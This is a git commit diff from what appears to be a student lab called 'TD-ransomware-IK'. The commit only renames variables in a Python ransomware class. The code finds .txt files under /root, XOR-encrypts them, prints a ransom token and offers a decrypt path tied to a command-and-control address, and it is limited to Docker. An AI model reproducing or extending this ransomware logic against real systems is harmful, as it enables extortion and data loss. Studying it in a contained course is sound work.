3a8485f4cca481838b082244680d1f3667a5b23f
Ilyas KAMAL <102556948+Obsterpouspug@users.noreply.github.com>
2022-11-28 19:39:05 +0100

    UPDATE RENAMING VARIABLES

--- TD-ransomware-IK/sources/ransomware.py
+++ TD-ransomware-IK/sources/ransomware.py
@@ -28,10 +28,10 @@ class Ransomware:
     def check_hostname_is_docker(self)->None:
         # At first, we check if we are in a docker
         # to prevent running this program outside of container
-        hostname = socket.gethostname()
-        result = re.match("[0-9a-f]{6,6}", hostname)
-        if result is None:
-            print(f"You must run the malware in docker ({hostname}) !")
+        HOSTNAME = socket.gethostname()
+        RESULT = re.match("[0-9a-f]{6,6}", HOSTNAME)
+        if RESULT is None:
+            print(f"You must run the malware in docker ({HOSTNAME}) !")
             sys.exit(1)
 
     def get_files(self, filter:str)->list:
@@ -39,13 +39,13 @@ class Ransomware:
         return list(Path("/root").glob(filter))
 
     def encrypt(self):
-        files = self.get_files("*.txt")
-        secret_manager = SecretManager()
-        secret_manager.setup()
-        secret_manager.xorfiles(files)
+        FILES = self.get_files("*.txt")
+        SECRET_MANAGER = SecretManager()
+        SECRET_MANAGER.setup()
+        SECRET_MANAGER.xorfiles(FILES)
 
-        token = secret_manager.get_hex_token()
-        print(ENCRYPT_MESSAGE.format(token.hex()))
+        TOKEN = SECRET_MANAGER.get_hex_token()
+        print(ENCRYPT_MESSAGE.format(TOKEN.hex()))
         
         
 
@@ -53,15 +53,15 @@ class Ransomware:
         # main function for decrypting (see PDF) try exept to catch the exception if the token is not valid
         try:
             # ask the user for the key
-            key = input("Enter the key: ")
+            KEY = input("Enter the key: ")
             # call set_key  & the the xorfile function
-            secret_manager = SecretManager(CNC_ADDRESS)
-            secret_manager.set_key(key)
-            files = self.get_files("*.txt")
-            for file in files:
-                secret_manager.xorfile(file)
+            SECRET_MANAGER = SecretManager(CNC_ADDRESS)
+            SECRET_MANAGER.set_key(KEY)
+            FILES = self.get_files("*.txt")
+            for FILE in FILES:
+                SECRET_MANAGER.xorfile(FILE)
             #call the clean function
-            secret_manager.clean()
+            SECRET_MANAGER.clean()
             # print the message & leave the program
             print("Your files have been decrypted")
             sys.exit(0)
@@ -75,8 +75,8 @@ class Ransomware:
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
     if len(sys.argv) < 2:
-        ransomware = Ransomware()
-        ransomware.encrypt()
+        RANSOMWARE = Ransomware()
+        RANSOMWARE.encrypt()
     elif sys.argv[1] == "--decrypt":
-        ransomware = Ransomware()
-        ransomware.decrypt()
+        RANSOMWARE = Ransomware()
+        RANSOMWARE.decrypt()
